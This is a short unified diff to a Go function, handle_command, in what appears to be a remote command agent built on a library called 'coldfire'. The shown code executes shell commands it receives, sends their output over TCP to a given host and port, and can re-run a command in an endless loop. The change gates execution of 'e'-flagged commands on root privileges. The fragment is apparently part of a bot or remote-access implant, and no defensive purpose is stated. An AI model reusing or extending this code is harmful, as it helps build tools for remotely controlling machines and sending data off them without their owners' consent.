@@ -222,6 +222,12 @@ func handle_command(cmd string) {
 		DataSender = coldfire.SendDataTCP
 	}
 	preamble := strings.Fields(cmd)[0]
+	can_execute := true
+	if strings.Contains(preamble, "e") {
+		if !coldfire.IsRoot() {
+			can_execute = false
+		}
+	}
 	if strings.Contains(preamble, "k") {
 		forwarded_preamble = preamble
 	}
@@ -230,7 +236,7 @@ func handle_command(cmd string) {
 		if strings.Contains(preamble, "s") {
 			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
 		}
-		if strings.Contains(preamble, "x") {
+		if strings.Contains(preamble, "x") && can_execute {
 			out, err := coldfire.CmdOut(cmd)
 			if err != nil {
 				out += ": " + err.Error()
@@ -241,7 +247,7 @@ func handle_command(cmd string) {
 				p, _ := strconv.Atoi(port)
 				coldfire.SendDataTCP(host, p, out)
 			}
-			if strings.Contains(preamble, "l") {
+			if strings.Contains(preamble, "l") && can_execute {
 				for {
 					coldfire.CmdRun(cmd)
 				}
